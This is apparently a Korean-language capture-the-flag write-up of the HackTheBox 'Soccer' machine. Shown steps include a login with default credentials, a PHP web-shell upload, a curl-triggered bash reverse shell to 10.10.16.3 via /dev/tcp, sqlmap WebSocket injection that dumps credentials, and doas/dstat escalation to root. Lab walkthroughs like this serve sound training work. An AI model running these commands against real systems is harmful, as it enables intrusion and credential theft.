# Soccer - HackTheBox
## Recon
```bash
sudo nmap -p 22,80,9091 -sC -sV -vv -oA soccer 10.10.11.194
```
<img width="1105" height="390" alt="image" src="https://github.com/user-attachments/assets/ce14dcc8-3687-4606-a37c-c1a82485e60a" />
<img width="1105" height="440" alt="image" src="https://github.com/user-attachments/assets/c2fd101f-207a-44df-bf5a-332d8e7239c8" />

- SSH(22)
- HTTP(80)
- HTTP(9091)

<br>

- `/etc/hosts`에 `soccer.htb` 추가.
<img width="1105" height="62" alt="image" src="https://github.com/user-attachments/assets/88f2551e-3813-4856-9852-4f8dba95cddc" />

---
## HTTP(80)
### banner grabbing
<img width="1105" height="329" alt="image" src="https://github.com/user-attachments/assets/b1f3ad79-f5c9-444e-bb66-e404ad454439" />

### gobuster
- `/tiny` 경로 발견.
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soccer.htb -x php,md,txt -t 50
```
<img width="1105" height="369" alt="image" src="https://github.com/user-attachments/assets/1562f900-91a0-4755-bdcf-21b8cc866e29" />

### web shell
- `H3K Tiny File Manager`로 연결.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/652b9ba5-200f-407b-b347-65c28a2bb7d6" />

<br>
<br>

- 기본 계정인 `admin:admin@123`으로 로그인.
- `Admin - Help`를 눌러서 `Tiny File Manager 2.4.3` 버전 확인.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/50dd29a5-17b5-43b7-958b-5c55340ef678" />

<br>
<br>

- 다른 폴더에는 업로드가 불가능하나 `/var/www/html/tiny/uploads`에 업로드가 가능하여 web shell 업로드.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/b97e706c-4d7a-4cef-af66-25b575edeb05" />

<br>
<br>

- 명령어 실행 가능.
```bash
curl 'http://soccer.htb/tiny/uploads/simple-backdoor.php?cmd=whoami'
```
<img width="1105" height="132" alt="image" src="https://github.com/user-attachments/assets/48107375-5319-4d4a-b5e4-98aa262f1163" />

<br>
<br>

- 리버스 셸 명령어 실행.
```bash
curl 'http://soccer.htb/tiny/uploads/simple-backdoor.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.16.3%2F80%200%3E%261%22'
```
<img width="1105" height="78" alt="image" src="https://github.com/user-attachments/assets/1eaed383-3710-4b55-8588-581348ed84cf" />

<br>
<br>

- 셸 획득.
<img width="1103" height="177" alt="image" src="https://github.com/user-attachments/assets/94ff3d07-c41b-4749-8fa4-00b0f091c6b3" />

---
## Privesc
### Blind SQL Injection
- `nginx`의 `VHOST` 확인.
- `soc-player.soccer.htb` 발견.
```bash
cat /etc/nginx/sites-enabled/soc-player.htb
```
<img width="1103" height="402" alt="image" src="https://github.com/user-attachments/assets/a2b2957f-7ba9-4a76-ae8c-92172dd3f209" />

<br>
<br>

- `/etc/hosts`에 `soc-player.soccer.htb`추가한 후 접속.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/4ed2ef00-1245-4e05-b1d2-49e8ea17a737" />

<br>
<br>

- 계정을 생성한 후 로그인하면 티켓 관련 페이지로 이동.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/8133078c-51d2-43f0-a3b8-6f3cbaa92cc1" />

<br>
<br>

- 만약 서버에서 입력에 대한 검증이 제대로 되지 않는다면 `SQL Injection`이 가능할 수 있음.
- `1234`를 입력했을 때는 티켓이 존재하지 않는다는 메시지가 나오지만, 인젝션을 실행하면 티켓이 존재한다고 나온다.
<img width="503" height="280" alt="image" src="https://github.com/user-attachments/assets/e9c3b93f-de9e-41d2-aaca-52ab0aac1af4" />
<img width="503" height="280" alt="image" src="https://github.com/user-attachments/assets/9652af39-c0bb-40c9-8f2b-e2ad62161f9f" />

<br>
<br>

- `burpsuite`로 해당 요청을 확인해보니 `Web Socket`을 사용하고 있다.
<img width="673" height="587" alt="image" src="https://github.com/user-attachments/assets/36c01a3b-67b0-4903-afee-81ca53f9fed0" />

<br>
<br>

- `sqlmap`을 사용하여 인젝션 테스트.
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"1234"}' --level 5 --risk 3 --threads 10 --batch
```
<img width="1105" height="200" alt="image" src="https://github.com/user-attachments/assets/39f92184-b1a1-49b0-823e-642474b68c53" />

<br>
<br>

- `soccer_db`의 `accounts`테이블을 확인하여 `player`의 계정 획득.
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"1234"}' --level 5 --risk 3 --threads 10 --batch -D soccer_db -T accounts --dump
```
<img width="1105" height="165" alt="image" src="https://github.com/user-attachments/assets/3d94d96e-270d-4c88-a406-76a24cff707b" />

<br>
<br>

- `player:PlayerOftheMatch2022` 로그인.
<img width="1105" height="78" alt="image" src="https://github.com/user-attachments/assets/ed6a9034-35c7-4257-b09d-f02940705efe" />

### doas
- `/usr/local/bin/doas`파일에 SUID가 설정.
<img width="1105" height="43" alt="image" src="https://github.com/user-attachments/assets/d55c85ea-a1e3-47a6-87bf-9ef29cd1d30d" />

<br>
<br>

- https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=doas#doas
- `sudo` 대신에 사용하는 프로그램.
<img width="890" height="180" alt="image" src="https://github.com/user-attachments/assets/04e92be3-eca8-4284-bb97-9920bf4ea10b" />

<br>
<br>

- `/etc/doas.conf` 대신 `/usr/local/etc/doas.conf`가 존재하는 것을 발견.
```bash
find / -name '*doas*' 2>/dev/null
```
<img width="1105" height="174" alt="image" src="https://github.com/user-attachments/assets/8d680957-ddb3-4a6f-945e-3b1a930c4f55" />

<br>
<br>

- `player`유저로 `root`권한으로 `/usr/bin/dstat`를 실행 가능.
<img width="1105" height="42" alt="image" src="https://github.com/user-attachments/assets/a413e077-01a3-4974-ab2d-26679e89e97d" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/dstat/
<img width="995" height="260" alt="image" src="https://github.com/user-attachments/assets/6af23d8d-8d2c-4496-8204-a1de59e56a79" />

<br>
<br>

- `GTFOBIN`을 참조하여 `root`획득.
```bash
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py

/usr/local/bin/doas -u root /usr/bin/dstat --xxx
```
<img width="1105" height="138" alt="image" src="https://github.com/user-attachments/assets/87d7d6a2-2647-4bbb-b8bb-99e0906a0f6d" />

---
## FLAG
- `/home/player/user.txt`
<img width="1105" height="211" alt="image" src="https://github.com/user-attachments/assets/e05e4a2c-2934-4a00-81f0-d291f5aa4df5" />

<br>
<br>

- `/root/root.txt`
<img width="1105" height="367" alt="image" src="https://github.com/user-attachments/assets/e7b6add1-b879-4879-8697-2d237753e01f" />
